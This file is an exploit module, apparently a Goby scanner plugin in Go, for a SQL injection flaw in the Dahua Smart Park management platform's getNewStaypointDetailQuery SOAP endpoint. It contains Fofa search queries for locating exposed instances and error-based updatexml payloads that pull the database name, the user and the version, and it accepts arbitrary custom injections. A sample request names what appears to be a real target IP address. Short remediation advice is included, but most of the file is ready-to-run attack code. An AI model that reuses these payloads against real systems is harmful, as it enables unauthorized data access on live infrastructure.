package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Dahua Smart Park Comprehensive Management Platform /portal/services/carQuery/getNewStaypointDetailQuery file SQL Injection Vulnerability",
    "Description": "<p>Dahua Comprehensive Management Platform is a comprehensive management platform with functions such as park operation and intelligent services. The platform aims to assist in optimizing the allocation of park resources, meeting diverse management needs, and enhancing user experience by providing intelligent services.  </p><p>Due to the getNewStaypointDetailQuery interface of Dahua Comprehensive Management Platform not filtering user input, it was directly concatenated into SQL query statements, resulting in SQL injection vulnerabilities in the system. Remote unauthorized attackers can exploit this vulnerability to obtain sensitive information and further exploit the possibility of obtaining target system privileges.</p>",
    "Product": "dahua-Smart-Park-GMP",
    "Homepage": "https://www.dahuatech.com/product/info/5609.html",
    "DisclosureDate": "2024-05-16",
    "PostTime": "2024-05-20",
    "Author": "15900373599@163.com",
    "FofaQuery": "body=\"/WPMS/asset/common/css/base.css\" || body=\"/WPMS/asset/lib\"",
    "GobyQuery": "body=\"/WPMS/asset/common/css/base.css\" || body=\"/WPMS/asset/lib\"",
    "Level": "2",
    "Impact": "<p>Due to the getNewStaypointDetailQuery interface of Dahua Comprehensive Management Platform not filtering user input, it was directly concatenated into SQL query statements, resulting in SQL injection vulnerabilities in the system. Remote unauthorized attackers can exploit this vulnerability to obtain sensitive information and further exploit the possibility of obtaining target system privileges.</p>",
    "Recommendation": "<p>1. Using parameterized queries can effectively prevent SQL injection attacks </p><p>2.Before accepting user input, the input data should be validated and filtered to ensure that it meets the expected format and range. </p><p>3. Assign database users the minimum permissions, limited to their required operations.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "查看当前数据库名,查看用户名,custom,sqlPoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "textarea",
            "value": "1 and 1=updatexml(1,concat(0x7e,(select @@version),0x7e),1)--",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/portal/services/carQuery/getNewStaypointDetailQuery",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
                    "Content-Type": "text/xml;charset=UTF-8"
                },
                "data_type": "text",
                "data": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:car=\"http://carQuery.webservice.dssc.dahua.com\">\n<soapenv:Header/>\n<soapenv:Body>\n<car:getNewStaypointDetailQuery>\n<!--type: string-->\n<searchJson>{}</searchJson>\n<!--type: string-->\n<pageJson>{\"orderBy\":\"1 and 1=updatexml(1,concat(0x7e,(select @@VERSION),0x7e),1)--\"}</pageJson>\n<!--type: string-->\n<extend>quae divum incedo</extend>\n</car:getNewStaypointDetailQuery>\n</soapenv:Body>\n</soapenv:Envelope>\n"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "concat",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulUrl|lastbody|variable|{{{fixedhostinfo}}}/portal/services/carQuery/getNewStaypointDetailQuery"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.4",
    "Translation": {
        "CN": {
            "Name": "大华智慧园区综合管理平台 /portal/services/carQuery/getNewStaypointDetailQuery 文件 SQL 注入漏洞",
            "Product": "dahua-智慧园区综合管理平台",
            "Description": "<p>大华综合管理平台”是一款综合管理平台，具备园区运营、和智能服务等功能。平台意在协助优化园区资源分配，满足多元化的管理需求，同时通过提供智能服务，增强使用体验。​</p><p>由于大华综合管理平台getNewStaypointDetailQuery接口处未对用户的输入进行过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞。远程未授权攻击者可利用此漏洞获取敏感信息，进一步利用可能获取目标系统权限。&nbsp;<br></p>",
            "Recommendation": "<p>\t1.使用参数化查询可以有效防止SQL注入攻击&nbsp;</p><p>2.在接受用户输入之前，应该对输入数据进行验证和过滤，确保输入的数据符合预期的格式和范围。&nbsp;</p><p>3.将数据库用户赋予最小的权限，仅限于其所需的操作。<br></p>",
            "Impact": "<p>由于大华综合管理平台getNewStaypointDetailQuery接口处未对用户的输入进行过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞。远程未授权攻击者可利用此漏洞获取敏感信息，进一步利用可能获取目标系统权限。&nbsp;<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Dahua Smart Park Comprehensive Management Platform /portal/services/carQuery/getNewStaypointDetailQuery file SQL Injection Vulnerability",
            "Product": "dahua-Smart-Park-GMP",
            "Description": "<p>Dahua Comprehensive Management Platform is a comprehensive management platform with functions such as park operation and intelligent services. The platform aims to assist in optimizing the allocation of park resources, meeting diverse management needs, and enhancing user experience by providing intelligent services.&nbsp;&nbsp;</p><p>Due to the getNewStaypointDetailQuery interface of Dahua Comprehensive Management Platform not filtering user input, it was directly concatenated into SQL query statements, resulting in SQL injection vulnerabilities in the system. Remote unauthorized attackers can exploit this vulnerability to obtain sensitive information and further exploit the possibility of obtaining target system privileges.<br></p>",
            "Recommendation": "<p>1. Using parameterized queries can effectively prevent SQL injection attacks&nbsp;</p><p>2.Before accepting user input, the input data should be validated and filtered to ensure that it meets the expected format and range.&nbsp;</p><p>3. Assign database users the minimum permissions, limited to their required operations.<br></p>",
            "Impact": "<p>Due to the getNewStaypointDetailQuery interface of Dahua Comprehensive Management Platform not filtering user input, it was directly concatenated into SQL query statements, resulting in SQL injection vulnerabilities in the system. Remote unauthorized attackers can exploit this vulnerability to obtain sensitive information and further exploit the possibility of obtaining target system privileges.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10953"
}`
	sqlInjectionXcsxawdw := func(hostInfo *httpclient.FixUrl, sqlPayload string) string {
		httpConfig := httpclient.NewPostRequestConfig("/portal/services/carQuery/getNewStaypointDetailQuery")
		httpConfig.VerifyTls = false
		httpConfig.FollowRedirect = false
		httpConfig.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")
		httpConfig.Header.Store("Content-Type", "text/xml;charset=UTF-8")
		body:="<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:car=\"http://carQuery.webservice.dssc.dahua.com\">\n<soapenv:Header/>\n<soapenv:Body>\n<car:getNewStaypointDetailQuery>\n<!--type: string-->\n<searchJson>{}</searchJson>\n<!--type: string-->\n<pageJson>{\"orderBy\":\""+sqlPayload+"\"}</pageJson>\n<!--type: string-->\n<extend>quae divum incedo</extend>\n</car:getNewStaypointDetailQuery>\n</soapenv:Body>\n</soapenv:Envelope>"
		httpConfig.Data = body
		resp, err := httpclient.DoHttpRequest(hostInfo, httpConfig)
		if err != nil {
			return ""
		}
		if strings.Contains(resp.Utf8Html, "XPATH") {
			reMsg := regexp.MustCompile("~(.*?)~")
			matchesMsg := reMsg.FindStringSubmatch(resp.Utf8Html)
			if len(matchesMsg) > 1 {

				return matchesMsg[1]
			}
		}
		return ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["attackType"].(string)
			custom := ss.Params["custom"].(string)
			var msg string
			var sqlPayload string
			if attackType == "查看当前数据库名" {
				sqlPayload = "1 and 1=updatexml(1,concat(0x7e,(select database()),0x7e),1)--"
				msg = sqlInjectionXcsxawdw(expResult.HostInfo, sqlPayload)
				if msg == "" {
					expResult.Output = "未知的攻击方式！"
					return expResult
				}
			} else if attackType == "查看用户名" {
				sqlPayload = "1 and 1=updatexml(1,concat(0x7e,(select user()),0x7e),1)--"
				msg = sqlInjectionXcsxawdw(expResult.HostInfo, sqlPayload)
				if msg == "" {
					expResult.Output = "未知的攻击方式！"
					return expResult
				}

			} else if attackType == "custom" {
				sqlPayload = custom
				msg = sqlInjectionXcsxawdw(expResult.HostInfo, sqlPayload)
				if msg == "" {
					expResult.Output = "未知的攻击方式！"
					return expResult
				}

			} else if attackType == "sqlPoint" {
				expResult.Output = "POST /portal/services/carQuery/getNewStaypointDetailQuery HTTP/1.1\nHost: 112.29.73.136:8009\nUser-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\nContent-Type: text/xml;charset=UTF-8\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:car=\"http://carQuery.webservice.dssc.dahua.com\">\n<soapenv:Header/>\n<soapenv:Body>\n<car:getNewStaypointDetailQuery>\n<!--type: string-->\n<searchJson>{}</searchJson>\n<!--type: string-->\n<pageJson>{\"orderBy\":\"1 and 1=updatexml(1,concat(0x7e,(select @@version),0x7e),1)--\"}</pageJson>\n<!--type: string-->\n<extend>quae divum incedo</extend>\n</car:getNewStaypointDetailQuery>\n</soapenv:Body>\n</soapenv:Envelope>"
				expResult.Success = true
				return expResult
			} else {
				expResult.Output = "未知的攻击方式！"
			}
			expResult.Success = true
			expResult.Output = sqlPayload + ":" + msg
			return expResult
		},
	))
}